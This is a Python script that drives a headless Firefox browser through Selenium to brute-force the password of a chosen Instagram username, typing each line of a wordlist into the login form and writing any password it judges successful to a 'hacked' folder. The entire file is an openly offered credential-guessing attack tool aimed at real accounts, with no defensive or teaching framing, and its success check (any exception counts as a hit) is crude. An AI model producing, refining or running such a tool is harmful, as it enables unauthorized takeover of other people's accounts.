#!/usr/bin/python3
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options

opt = Options()
opt.headless = True

target = input("TARGET USERNAME ~> ")
path = input("PATH TO WORDLIST.txt ~> ")
save = input("SAVE ONLY HACKED OR ALL TRYED PASSWORDS [o/a/n] ~> ")

instagram = 'https://www.instagram.com'
insta_login = 'https://www.instagram.com/accounts/login/'

web = webdriver.Firefox(options=opt)
print(f'[+] GOING TO ~> {insta_login}...')
web.get(insta_login)
time.sleep(2)

login = web.find_element(By.NAME, "username")
login.send_keys(target)
print(f'[+] TYPING TARGET USERNAME ~> {target}...')
time.sleep(2)

try:
  bruteforce = open(path, 'r')
except FileNotFoundError:
  print(f"[-] {path} wordlist.txt not found")
  web.quit()
  exit()

for brute in bruteforce:
  password = web.find_element(By.NAME, 'password')
  brute = brute.strip()
  if save == 'a':
    tryed_password = open(f'tryed/{target}.txt', 'a')
    tryed_password.write(f'{brute}\n')
  try:
    password.send_keys(brute, Keys.RETURN)
    time.sleep(3.5)
    password.clear()
    print(f"[-] TRYING PASSWORD ~> {brute}")
  except:
    with open(f'hacked/{target}.txt', 'w') as hacked_password:
      hacked_password.write(brute)
    print(f'[+] PASSWORD WAS FOUND ~> {brute}')
    web.quit()
    break
